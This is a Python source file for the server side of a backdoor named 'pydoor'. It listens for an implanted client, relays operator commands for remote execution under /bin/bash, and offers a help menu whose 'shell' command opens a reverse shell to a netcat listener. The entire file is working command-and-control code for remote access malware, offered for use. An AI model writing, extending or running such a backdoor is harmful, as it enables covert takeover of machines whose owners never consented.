#!/usr/bin/env python

import socket
import time
import sys

BUFFER = 4096

class Server:

    def __init__(self):
        self.sock = 0
        self.con = 0
        self.host = 0
        self.cmd = 0
        self.usage = """
pydoor integrated shell help.


sleep | Break the connection with the client, but the client will still run and wait for a server. 
quit | Kills the client and the server.
shell [ip] [port]  | Drop a reverse shell to the ip and port specified depending on your current shell, it is recommended to send it to a netcat listener.
setshell [absolute/path/to/shell] | Change the shell that the integrated shell will be wrapped around.       

**Running any other command will make the client attempt to run it with /bin/bash or /bin/sh, or the shell specified via setshell.
        
        
        """

        self.quitwarning = """WARNING : Running quit will kill the client program, proceed ? [Y/n]: """

    def handle_response(self, resp):
        if "pydoor.quit" in resp:
            print("Quit signal received from client " + self.host)
            sys.exit(0) 
        else:
            print(resp)



    def recvall(self):
        data = b''
        while True:
            part = self.con.recv(BUFFER)
            data += part
            if len(part) < BUFFER:
                break
        return data

    def preprocesscmd(self):

        if self.cmd == "shellhelp":
            print(self.usage)
            return 1

        elif self.cmd == "quit":
            choice =  input(self.quitwarning)

            if choice.lower() == "y" or choice.lower() == "yes":
                return 0
            else:
                return 1
        
        else:
            return 0



    def start(self):

        print("Starting server")

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)


        self.sock.bind(("127.0.0.1", 9999))

        self.sock.listen(1)

        while True:
            
            self.con, addr = self.sock.accept()
            rdata = self.con.recv(BUFFER)
            

            if rdata:
                self.host = str(self.sock.getsockname()).strip("(").strip(")").strip(",").replace("'", "") #Remove tuple stuff like parentheses before printing, we dont need any anyways
                
                print(f"Connection received from client, {self.host} dropping shell")
                while True:
                    self.cmd = input(">")
                    if self.cmd == "":
                        continue
                    if (self.preprocesscmd() == 0):

                        self.con.send(self.cmd.encode())
                        dat = self.recvall().decode()
                        self.handle_response(dat.rstrip())
                    else:
                        pass

                
if __name__ == "__main__":
    s = Server()

    s.start()